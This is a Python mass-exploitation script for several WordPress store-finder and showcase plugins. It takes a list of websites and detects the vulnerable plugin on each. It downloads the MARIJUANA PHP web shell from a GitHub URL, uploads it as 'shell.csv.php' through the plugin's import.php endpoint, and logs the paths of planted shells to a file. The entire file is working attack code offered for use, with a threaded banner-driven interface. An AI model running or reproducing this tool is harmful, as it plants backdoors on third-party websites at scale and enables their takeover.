import requests as req
import sys
from concurrent.futures import ThreadPoolExecutor
import urllib3
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {}
#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080',
#}
target_plugins = [["superlogoshowcase-wp", "sls-wp-admin"],
["superstorefinder-wp", "ssf-wp-admin"],
["super-interactive-maps","sim-wp-admin"]]
s = req.Session()
s.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"})
print_error = lambda x: print("\033[31m{}\033[0m".format(x))
error_back = lambda x: "\033[41m\033[97m{}\033[0m\033[0m".format(x)
success_back = lambda x: "\033[42m\033[97m{}\033[0m\033[0m".format(x)
print_success = lambda x: print("\033[32m{}\033[0m".format(x))
class SuperStoreFinderExpl():
    target=""
    home_target=""
    def __init__(self, target=None):
        self.home_target=target.decode()
        target = self.DetectPlugin(target)
        if target:
            self.target =  target
        else:
            self.target = False
    def Mass(file, count_thread, result_file):
        try:
            with ThreadPoolExecutor(max_workers=int(count_thread)) as thread:
                with open(file, "rb") as file:
                    lines = [line.rstrip() for line in file]
                    for url in lines:
                        ini_budi = SuperStoreFinderExpl(url)
                        thread.submit(ini_budi.Exploit(result_file=result_file))
        except Exception as e:
            sys.exit(e)
    def Exploit(self, result_file=None):
        if not self.target:
            print_error("{} FAILED".format(error_back(" [{}][ERR] ".format(self.home_target))))
            return
        try:
            shell_content=s.get("https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php").text
            r=s.post("{}/pages/import.php".format(self.target), files={"default_location":("shell.csv.php",shell_content.encode(), "text/csv")},proxies=proxies, verify=False)
            if r.status_code == 200 or r.status_code == 500: 
                shell_path = self.ShellFinder()
                if shell_path is not False:
                    print_success("{} {}".format(success_back(" [{}][OK] ".format(self.home_target)), shell_path))
                    if result_file:
                        with open(result_file, "a") as newline:
                            newline.write("{}\n".format(shell_path))
                            newline.close()
                else:
                    print_error("{} FAILED".format(error_back(" [{}][ERR] ".format(self.home_target))))
        except Exception as e:
            print_error("{} FAILED".format(error_back(" [{}][ERR] ".format(self.home_target))))
    def ShellFinder(self):
        shell_paths=["{}/shell.csv.php".format(self.target),"{}/pages/SSF_WP_UPLOADS_PATH/csv/import/shell.csv.php".format(self.target)]
        try:
            for path in shell_paths:
                r=s.get(path, proxies=proxies, verify=False)
                if r.status_code == 200 and "MARIJUANA" in r.text:
                    return path
        except Exception:
            return False
        return False

    def DetectPlugin(self, target):
        for plugin_name, admin_path in target_plugins:
            try:
                calon_target="{}/wp-content/plugins/{}/{}".format(target.decode(), plugin_name, admin_path)
                r=s.get(calon_target, proxies=proxies, verify=False)
                if r.status_code == 200 or r.status_code == 301:
                    return calon_target
            except Exception as e:
                return False
        return False
def clear():
    linux   = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])
def Main():
    clear()
    banner = """
          __n__n__
   .------`-\\00/-'
  /  ##  ## (oo)
 / \## __   ./
    |//YY \|/
    |||   |||          ^^^ ^
+-----------------------------------------------------------------------+
| Title          : SuperStoreFinder Wordpress Plugins Mass Shell Upload |
| Coder          : s4ndal.py                                            |
+-----------------------------------------------------------------------+
    """
    print_success(banner)
    websites_list = input("[?] Websites list > ")
    threads = input("[?] Threads > ")
    ask_result = input("[?] Save in result file ? y/n > ")
    if ask_result == "y": 
        result_file = input("[?] Result file name > ")
        if not open(result_file, "w+"):
            print("cant make result file")
            ini_budi = SuperStoreFinderExpl
            ini_budi.Mass(websites_list, threads, result_file=None)
        else:
            ini_budi = SuperStoreFinderExpl
            ini_budi.Mass(websites_list, threads, result_file)
    else:
        ini_budi = SuperStoreFinderExpl
        ini_budi.Mass(websites_list, threads, result_file=None)
if __name__=="__main__":
    Main()